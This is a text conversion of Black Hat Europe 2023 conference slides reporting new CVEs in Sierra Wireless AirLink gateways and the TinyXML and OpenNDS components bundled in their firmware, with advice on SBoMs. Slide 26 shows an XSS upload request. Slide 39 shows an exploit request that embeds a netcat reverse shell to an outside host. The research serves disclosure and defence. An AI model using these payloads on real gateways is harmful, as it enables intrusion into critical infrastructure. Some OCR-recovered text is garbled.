---
title: "Old Code Dies Hard Finding New Vulnerabilities in Old Third-Party Software Components and the Importance of Having SBoM for IoTOT Devices"
speakers: ["Stanislav Dashevskyi", "Francesco La Spina"]
conference: "Black Hat"
conference_full: "Black Hat Europe 2023"
edition: "Europe"
year: 2023
source_pdf: "Black Hat Europe 2023 slides/Stanislav Dashevskyi, Francesco La Spina_Old Code Dies Hard Finding New Vulnerabilities in Old Third-Party Software Components and the Importance of Having SBoM for IoTOT Devices.pdf"
pages: 48
sha256: "df4d557706cae38fecd41e485ea8fa7005bcae53fa5099eed6bc270767e9e13c"
text_chars: 18416
ocr_pages: 2
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.6
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:04:42Z"
---
# Old Code Dies Hard Finding New Vulnerabilities in Old Third-Party Software Components and the Importance of Having SBoM for IoTOT Devices

**Speakers:** Stanislav Dashevskyi, Francesco La Spina  
**Conference:** Black Hat Europe 2023  
**Source:** `Black Hat Europe 2023 slides/Stanislav Dashevskyi, Francesco La Spina_Old Code Dies Hard Finding New Vulnerabilities in Old Third-Party Software Components and the Importance of Having SBoM for IoTOT Devices.pdf` (48 pages)


## Slide 1

# Old code dies hard:

Finding new vulnerabilities in old third-party software components and the importance of having SBoM for IoT/OT devices

Stanislav Dashevskyi, Francesco La Spina

#BHEU @BlackHatEvents

## Slide 2

### The researchers

• **<u>Stanislav Dashevskyi</u>**

- **<u>Francesco La Spina</u>**

- **Daniel dos Santos**

- **Amine Amri**

- **Rob Hulsebos**

- **Jos Wetzels**

- **ChatGPT** and **DALLE-3***

*for generating the medieval raccons

#BHEU @BlackHatEvents

Information Classification: General

## Slide 3

### Motivation

- Most attacks leverage vulnerabilities in IT infra. The **OT/IoT network perimeter** has less attention, **could it be as attractive to attackers** ?

- Manufacturers keep relying upon **security through obscurity** and the **many eyes principle**

- We (among others) hypothesise that **potential attackers are benefiting from these principles on a much larger scale**

- We looked at a popular family of devices that can be often found at the edge of IT and OT/IoT networks – **Sierra Wireless AirLink gateways**

#BHEU @BlackHatEvents

Information Classification: General

## Slide 4

### Outline

- Why looking at Sierra Wireless gateways in 2023?

- Performing a research on (not so) closed-source software packages

- New vulnerabilities in the old code

- Rooting a device

- Potential impact

- Takeaways for researchers and manufacturers

#BHEU @BlackHatEvents

Information Classification: General

## Slide 5

Why looking at Sierra Wireless AirLink gateways in 2023?

#BHEU @BlackHatEvents

Information Classification: General

## Slide 6

### Why SW AirLink gateways?

- SW AirLink is one the most popular brand of IoT/OT gateways (along with Teltonika, InHand, and MOXA)

- SW devices are also very popular on Shodan (more on that later)

- These gateways connect critical devices in electrical substations, oil and gas fields, and smart cities

- Used in police vehicles, for industrial asset monitoring and manufacturing, remote healthcare locations, and electric vehicle charge stations

The images are taken from https://www.sierrawireless.com/company/

#BHEU @BlackHatEvents

Information Classification: General

## Slide 7

### Why SW AirLink gateways?

- Example: an Axis IP camera connected to an AirLink LX40 gateway

The images are taken from https://www.axis.com/

#BHEU @BlackHatEvents

Information Classification: General

## Slide 8

### Why SW AirLink gateways?

- We found thousands of SW devices exposed via Internet (Shodan)

- We used fingerprints for **ACEmanager** – a web UI used for managing the device, which should never be exposed to Internet

###### **_ACEmanager’s favicon:_**

#BHEU @BlackHatEvents

Information Classification: General

## Slide 9

### Why SW AirLink gateways?

• Has there been any previous vulnerability research?

##### **No vulnerable third-party components?**

#BHEU @BlackHatEvents

Information Classification: General

## Slide 10

Performing research on (not so) closedsource packages

#BHEU @BlackHatEvents

Information Classification: General

## Slide 11

### Methodology

#BHEU @BlackHatEvents

Information Classification: General


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
black hat
1. Obtaining devices and
firmware/software
2.Decrypting/unpacking 3. Black-box functional
packages. software packages. analysis.
4. Component oO. 5. Static and dynamic
identification and TTT] analysis of selected
prioritization. binaries and sources.
Information Classification: General
```

## Slide 12

### Choosing a target device

- We focused on devices that ship with **ALEOS** (AirLink Enterprise Operating System)

- Parts of ALEOS have been well-researched in the past, but not the third-party components. **We also could not find any SBoMs** , so this was an additional criteria

- We picked **AirLink LX60** for its versatility, availability, and a relatively low cost (we could easily get one from a local reseller)

- Firmware package ( **ALEOS 4.16.0** ) can be downloaded from the Sierra Wireless website

The images are taken from https://www.sierrawireless.com/

#BHEU @BlackHatEvents

Information Classification: General

## Slide 13

### Peeking into firmware packages

• The firmware package for some EOL devices is unencrypted, many internal binaries contain debugging symbols

- This was extremely helpful in understanding some parts of ALEOS

#BHEU @BlackHatEvents

Information Classification: General

## Slide 14

### Peeking into firmware packages

- The latest ALEOS firmware packages are encrypted

- However, Ruben Santamarta from IOActive Labs has reversed the firmware decryption logic*

- The firmware is still using AES CTR without any hardcoded key or IV:

**_Custom “version”_**

**_Custom “seed”_**

*https://labs.ioactive.com/2020/09/no-buffers-harmed-rooting-sierra.html

#BHEU @BlackHatEvents

Information Classification: General

## Slide 15

### Emulation

- We used Docker to set up and run ACEmanager (and some other binaries) originally shipped with ALEOS 4.16.0 (chroot, modified configs, qemu arm system emulator)

- Very handy to emulate parts of the system, since there were no debugging capabilities on the device

#BHEU @BlackHatEvents

Information Classification: General

## Slide 16

### Finding the right components

- ALEOS is large, so we had to prioritize the analysis for the best ROI for the attackers

- **ACEmanager** has been found vulnerable in the past, but it’s commonly exposed to the Internet

- **AT commands interface** (configuration via Telnet) also looked promising

- **Did not find any SBoM** , but there are quite a few open source components shipped along

- **No one has looked at how FOSS components are integrated to ALEOS** . TinyXML had only 1 past vulnerability, while OpenNDS had none.

#BHEU @BlackHatEvents

Information Classification: General

## Slide 17

## New vulnerabilities in the old code

#BHEU @BlackHatEvents

Information Classification: General

## Slide 18

#### Overview of findings

- In total, we found **21 security bugs** that affect ALEOS and/or integrated open source components

- **15 are found on the open source components (10 affect ALEOS directly)**

- Hardcoded credentials, state confusion

- Multiple Denial-of-Service issues (DoS)

- Stored Cross-Site Scripting (XSS)

- Multiple Code / Command Execution issues (RCE)*

*Only 1 affects ALEOS directly

#BHEU @BlackHatEvents

Information Classification: General

## Slide 19

#### TinyXML: A low hanging fruit

- **TinyXML** is a project for parsing XML. It has been completely replaced by TinyXML-2 a few years ago and **is unsupported** .

- We found that TinyXML is used in ACEmanager (the code is compiled into the binary)

- We first checked if there are any existing vulnerabilities that might affect ACEmanager through TinyXML

- We then took the latest code of TinyXML and created a simple fuzzer with libFuzzer… in a few seconds we got the first results

#BHEU @BlackHatEvents

Information Classification: General

## Slide 20

#### TinyXML: infinite loop

- **CVE-2021-42260** / **CVE-2023-40458:** infinite loop condition that was never fixed

- The bug report and a simple PoC can be still found on sourceforge: <u>https://sourceforge.net/p/tinyxml/bugs/141/</u>

0xef

**When p+1 or p+2 are NULL…**

**…there is no “else” branch**

#BHEU @BlackHatEvents

Information Classification: General

## Slide 21

#### TinyXML: reachable assertion

- **CVE-2023-34194** / **CVE-2023-40462** : a reachable assertion (crash)

The “!p || !*p”
check is missing

#BHEU @BlackHatEvents

Information Classification: General

## Slide 22

#### Vulnerabilities in ALEOS

While looking at the filesystem of ALEOS and ACEmanager, we found several issues:

- **CVE-2023-40450** : null-pointer dereference when parsing login credentials in ACEmanager

- **CVE-2023-40460 and CVE-2023-40461** : stored XSS via unrestricted file upload in ACEmanager

- **CVE-2023-40464** : hardcoded TLS private key and cert used in ACEmanager by default

- **CVE-2023-40463** : hardcoded root password hash

#BHEU @BlackHatEvents

Information Classification: General

## Slide 23

#### XSS via unrestricted file upload

- **CVE-2023-40460** allows to replace legitimate HTML pages with arbitrary content

- We think, it might be an incomplete fix for **CVE-2018-4063**

- Requires valid credentials from ACEmanager’s user

#BHEU @BlackHatEvents

Information Classification: General

## Slide 24

#### XSS via unrestricted file upload

- The content of the uploaded files is (almost) not validated, the files end up in **/var/tmp/acemanager/userupload”**

- That folder has a symlink **“/www/auth/user/upload** ”

- ACEmanager’s binary does a weird thing with wildcards:

**/var/tmp/acemanager/userupload /var/tmp/acemanager/viewerupload**

**/www/auth/user/upload /www/auth/viewer/upload /admin/ /www/auth/viewer**

#BHEU @BlackHatEvents

Information Classification: General

## Slide 25

#### XSS via unrestricted file upload

- You can upload files with any extension **(.cgi are not executable after the fix for CVE-2018-4063)**

- The content validation is very easy to bypass

- If we upload files with exiting filenames, they will be served instead of the original ones

- **/www/auth/user/upload/ACEmanagerX.html /admin/ACEmanagerX.html**

- **/www/auth/viewer/ACEmanagerX.html**

#BHEU @BlackHatEvents

Information Classification: General

## Slide 26

#### XSS via unrestricted file upload

#BHEU @BlackHatEvents

Information Classification: General


> Recovered by OCR — confidence 83/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
POST /cgi-bin/template_upload.cgi HTTP/1.1
Host: 192.168.56.129:1080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: */*
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/Torm-data; boundary=---------------------------36403764903309292865293292283
Content-Length: 386
Connection: keep-alive
Referer: http://192.168.56.129:1080/admin/ACEmanagerX. html
Content-Disposition: form-data; name="upload-file"; filename="ACEmanagerX. html"
<?xml version=
Jentmi> |
<body> =
<img sre="devnull" onerror="alert("ALL YOUR ROUTER BELONGS TO US')"/>
</html>
Date: Mon, @2 Oct 2023 13:24:16 GMT
Connection: close
X-Frame-Options: SAMEQRIGIN
Content-Type: text/plain
Successfully uploaded template.
Information Uiassitication: General
```

## Slide 27

### Hardcoded goodies

- Upon closer inspection, the filesystem reveals the default TLS key/cert

- While these can be changed by users, we found about 22K devices in the wild that didn’t do so

- The private key/cert can be used for spoofing the encrypted traffic between the affected ACEmanager and its clients

- For instance, as we shown before, credentials are transferred in the cleartext: **CVE-2018-4069** , mitigated by recommending to use HTTPS

#BHEU @BlackHatEvents

Information Classification: General

## Slide 28

### Hardcoded goodies

- There is a diagnostic shell that can be enabled via ACEmanager (accessible through SSH)

- _“When enabled, this field allows Sierra Wireless Tech Support personnel to locally access the diagnostic shell on your router […]”_

- By default the root login is disabled, when the option is enabled, a **hardcoded SHA512 password hash** for the root user is added to the **“/etc/shadow** ” file

- The hash is hardcoded into the **cmdexe** binary and is very poorly obfuscated (a substitution cypher)

- Unfortunately, the password seems to have decent entropy, so we were unable to recover it at the time

- **Still, we had to find another way to root the device…**

#BHEU @BlackHatEvents

Information Classification: General

## Slide 29

### Issues with captive portals

- ACEmanager allows to set up the WiFi interface as a captive portal

- _“A_ **_captive portal_** _is a web page accessed with a_ _<u>web browser</u> that is displayed to newly connected users of a_ _<u>WiFi</u> or wired network before they are granted broader access to network resources._ ”*

- There is **simple** ( **OpenNDS** ) and **authenticated** ( **CoovaChilli** ) **captive portal**

- OpenNDS is an open source captive portal, forked from **Nodogsplash**

- We were very curious about OpenNDS as the project seems to be mature enough, but it had no public CVEs

*https://en.wikipedia.org/wiki/Captive_portal

#BHEU @BlackHatEvents

Information Classification: General

## Slide 30

### Issues with captive portals

- We immediately spotted that ALEOS used the version 9.1.1, while the latest at the time was 9.10.0

- So we decided to first have a look at the source code repository for some **silent patches** …

- By having a look at the patch diff we could quickly understand the root cause

- The issue does not affect any OpenNDS release (e.g., “Accept” header was not yet processed in 9.1)

- Nevertheless, we spotted some similar code and decided to do some **variant hunting**

#BHEU @BlackHatEvents

Information Classification: General

## Slide 31

### Issues with captive portals

- We spotted **6 more issues that exhibit the same anti-pattern** :

**user_agent is NULL**

**It will remain NULL if the header is not present**

**Passing NULL into strlen() will trigger a segfault**

**GET /opennds_preauth/ HTTP/1.1**

#BHEU @BlackHatEvents

Information Classification: General

## Slide 32

### Issues with captive portals

• By design, OpenNDS relies on the ability to execute “external” bash scripts for various purposes

#BHEU @BlackHatEvents

Information Classification: General

## Slide 33

### Issues with captive portals

- If the “unescape” callback is enabled in the config, the captive portal allows for arbitrary OS command execution ( **CVE-2023-38316** )

#BHEU @BlackHatEvents

Information Classification: General

## Slide 34

### Issues with captive portals

- If the “unescape” callback is enabled in the config, the captive portal allows for arbitrary OS command execution ( **CVE-2023-38316** )

- We found **4 more issues like this one** , none of them affect ALEOS (default config is used)

#BHEU @BlackHatEvents

Information Classification: General

## Slide 35

## Rooting a device

#BHEU @BlackHatEvents

Information Classification: General

## Slide 36

### Rooting a device

- **CVE-2023-41101 / CVE-2023-40465** : a stack- (heap-)based buffer overflow

- The vulnerable code originates from Nodogsplash

###### **GET /?hello=world HTTP/1.1\nHost: localhost\n\n**

**Parses the query parameters**

**Calls get_query()**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 37

### Rooting a device

- It’s difficult to estimate the exploitability (depends on so many factors!), what about the LX60?

- **The binary has all the symbols**

- **PIE is not enabled**

- **Lots of other useful binaries inside**

- **NX is enabled**

- **Other bugs in query string parsing that prevents ROP chains**

- • **ASLR is enabled (but weak), need to leak some memory**

#BHEU @BlackHatEvents

Information Classification: General

## Slide 38

### Leaking some memory

**0x76400470***

* **We get only 2 base addresses (limitations of ASLR): either 0x76400000, or 0x76500000**

#BHEU @BlackHatEvents

Information Classification: General

## Slide 39

### Rooting the LX60

**GET busybox nc 192.168.17.100 1337 -w 4096 -e /bin/bash?[PADDING][URL_ADDR][PADDING] [GADGET_ADDR] HTTP/1.1 […]**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 40

## Potential impact

#BHEU @BlackHatEvents

Information Classification: General

## Slide 41

### Impact

- We found more than **80K devices exposed on Shodan**

- **Examples of organizations** that expose SW gateways online include **power distribution** , **national health systems** , **waste management** , **retail** , and **vehicle tracking**

- TinyXML will never be fixed upstream. We found its traces in the products of **29 vendors** (+ **7 open source projects** ).

- For **OpenNDS/Nodogsplash** it is quite difficult to

- track, however we found **OpenWRT** and **DD-WRT –** popular open source Linux distributions for routers

**_Distribution of SW gateways by industry (as seen in FSCT Device Cloud):_**

#BHEU @BlackHatEvents

Information Classification: General

## Slide 42

### Impact: EOL/EOS devices

- **Many of the devices** we could fingerprint via Telnet don’t run **the latest version of software**

- There is quite a number of these devices that is either EOL, or EOS (soon to be EOL) – there will be no security patches for those

###### **_Devices with the AT interface exposed:_**

###### **_Unpatched devices among those:_**

#BHEU @BlackHatEvents

Information Classification: General

## Slide 43

### Are attackers exploiting SW?

- We set up several ACEmanager honeypots in the US/EU regions

- We observed around **5,5K** of unique IP addresses attacking those, the attacks are mostly indiscriminate

- **Portscans and information disclosure attacks**

- **PHP-based web-framework exploitation** (WordPress, Laravel)

- **Java-based web-framework exploitation** (JAWS, Log4J)

- **OT/IoT device exploitation** (SonicWall, Siemens SL7, Tridium Niagara, Netgear, D-Link, GPON,  Netlink, HNAP protocol, etc.)

- **Malware** (multiple Mirai variants, Gh0st RAT, SystemBC)

#BHEU @BlackHatEvents

Information Classification: General

## Slide 44

### They do!

- We observed several IP addresses exploiting a chain of vulnerabilities disclosed by Cisco Talos in 2019

- We’ve seen **several successful login attempts**

- **CVE-2018-4068, CVE-2018-4070, CVE-2018-4071** (information disclosure)

- **CVE-2018-4063** (OS command execution via unrestricted file upload)

- **The attackers used the PoC scripts published in the original report by Cisco**

- **<u>We have not seen any exploitation attempts for vulnerabilities, for which no public PoCs were available</u>**

#BHEU @BlackHatEvents

Information Classification: General

## Slide 45

### Attack scenarios: healthcare

https://www.theguardian.com/technology/20 14/nov/10/hotel-wi-fi-infected-businesstravellers-asia-kaspersky

#BHEU @BlackHatEvents

Information Classification: General

## Slide 46

Takeaways for researchers and manufacturers

#BHEU @BlackHatEvents

Information Classification: General

## Slide 47

### Takeaways

- **Pay attention to risks from unpatched vulnerabilities**

- **Exploit mitigations in embedded devices are not cutting it**

- **Remove unused binaries and dead code** from firmware / software packages

- • **Investigate the root causes of reported vulnerabilities** , not only what is covered by PoC. **Incomplete fixes will cause more vulnerabilities**

- **Provide a thorough root cause analysis** with vulnerability reports

- **Foster collaboration** and be nice to researchers (thank you, Sierra Wireless!)

#BHEU @BlackHatEvents

Information Classification: General

## Slide 48

### Takeaways (continued)

- **IoT/OT devices may pose significant risk when compromised** (on par with IT infra)

- **Avoid security by obscurity** , adopt the “secure by default” approach

- **Don’t trust the many eyes principle:** compile accurate SBoMs and treat thirdparty code as your own, support open source software

#BHEU @BlackHatEvents

Information Classification: General
